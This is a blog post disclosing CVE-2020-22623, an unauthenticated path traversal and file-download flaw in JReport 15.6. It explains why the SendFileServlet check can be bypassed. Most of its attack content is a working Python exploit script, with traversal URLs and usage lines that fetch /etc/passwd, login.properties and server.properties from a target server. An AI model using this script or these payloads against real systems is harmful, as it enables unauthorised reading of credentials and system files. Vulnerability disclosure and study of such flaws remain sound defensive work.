[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F83224cef32c8&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40nguyenhongphu%2Fcve-2020-22623-jinfornet-jreport-unauthenticated-path-traversal-arbitrary-file-download-83224cef32c8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40nguyenhongphu%2Fcve-2020-22623-jinfornet-jreport-unauthenticated-path-traversal-arbitrary-file-download-83224cef32c8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2020–22623 — Jinfornet Jreport Unauthenticated Path traversal & Arbitrary File Download

[![Nguyen Hong Phu](https://miro.medium.com/v2/resize:fill:88:88/0*rOzAo0_DiSTgi8dq.)](/%40nguyenhongphu?source=post_page---byline--83224cef32c8--------------------------------)

[Nguyen Hong Phu](/%40nguyenhongphu?source=post_page---byline--83224cef32c8--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F6646280abdac&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40nguyenhongphu%2Fcve-2020-22623-jinfornet-jreport-unauthenticated-path-traversal-arbitrary-file-download-83224cef32c8&user=Nguyen+Hong+Phu&userId=6646280abdac&source=post_page-6646280abdac--byline--83224cef32c8---------------------post_header-----------)

2 min read·Jul 10, 2023

--

Listen

Share

Quick writeup about Jreport vulnerability allow unauthenticated attacker can perform Patch traversal attack & arbitrary file download.

> # Exploit Title: Jreport Jinfornet File Patch Traversal
> # Date: 26/03/2020
> # Exploit Author: hongphukt
> # Vendor Homepage: <https://www.jinfonet.com/>
> # Software Link: <https://www.jinfonet.com/product/download-jreport/>
> # Version: JReport 15.6
> # Tested on: Linux, Windows
> # CVE: CVE-2020–22623

Jreport Help function have a path traversal vulnerability in the SendFileServlet allows remote unauthenticated users to view any files on the Operating System with Application services user permission. This vulnerability affects Windows and Unix operating systems.

# Technical Details

Jreport before loggedin have help function with url:

<https://serverip/jreport/sendfile/help/userguide/server/index.htm>

senfile url processing by **jet.server.servlets.SendFileServlet** class.

> <servlet>
>  <servlet-name>sendfile</servlet-name>
>  <servlet-class>jet.server.servlets.SendFileServlet</servlet-class>
>  </servlet>
>  <servlet-mapping>
>  <servlet-name>sendfile</servlet-name>
>  <url-pattern>/sendfile/\*</url-pattern>
>  </servlet-mapping>

In jet.server.servlets.SendFileServlet class, request will go on when it’s authenticated or start url by ‘/help/’

> if ((!isAuthentic) && (!path.startsWith(“/help/”))) {
>  httpRptServer.getHttpUserSessionManager().sendUnauthorizedResponse(req, res, this.D, httpRptServer.getResourceManager().getRealm());
>  return;
> }

So the function reading file without any path validation

![]()

Exploit: <https://www.exploit-db.com/exploits/48260>

Get login properties, /etc/password file by get url:

<http://jreport.test/jreport/sendfile/help/../bin/login.properties>

<http://jreport.test/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd>

```
# Exploit Code

import requests
import argparse

def exploit(url, file):

    session = requests.Session()
    rawBody = "\r\n"
    response = session.get("{}/jreport/sendfile/help/{}".format(url,file), data=rawBody)

    if response.status_code == 404:
        print("The '{}' file was not found.".format(file))
    else:
        print("-" *22)
        print(response.content)
        print("-" *22)

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Jreport Path traversal & Arbitrary File Download')
    parser.add_argument('-u', action="store", dest="url", required=True, help='Target URL')
    parser.add_argument('-f', action="store", dest="file", required=True, help='The file to download')
    args = parser.parse_args()

    exploit(args.url, args.file)

# python jreport_fileread.py -u http://jreport.address -f "../../../../../../../../../../../../../../etc/passwd/"
# python jreport_fileread.py -u http://jreport.address -f "../bin/login.properties"
# python jreport_fileread.py -u http://jreport.address -f "../bin/server.properties"
```

--

--

[![Nguyen Hong Phu](https://miro.medium.com/v2/resize:fill:96:96/0*rOzAo0_DiSTgi8dq.)](/%40nguyenhongphu?source=post_page---post_author_info--83224cef32c8--------------------------------)[![Nguyen Hong Phu](https://miro.medium.com/v2/resize:fill:128:128/0*rOzAo0_DiSTgi8dq.)](/%40nguyenhongphu?source=post_page---post_author_info--83224cef32c8--------------------------------)Follow[## Written by Nguyen Hong Phu](/%40nguyenhongphu?source=post_page---post_author_info--83224cef32c8--------------------------------)[22 Followers](/%40nguyenhongphu/followers?source=post_page---post_author_info--83224cef32c8--------------------------------)·[26 Following](/%40nguyenhongphu/following?source=post_page---post_author_info--83224cef32c8--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----83224cef32c8--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----83224cef32c8--------------------------------)[About](/about?autoplay=1&source=post_page-----83224cef32c8--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----83224cef32c8--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----83224cef32c8--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----83224cef32c8--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----83224cef32c8--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----83224cef32c8--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----83224cef32c8--------------------------------)[Teams](/business?source=post_page-----83224cef32c8--------------------------------)

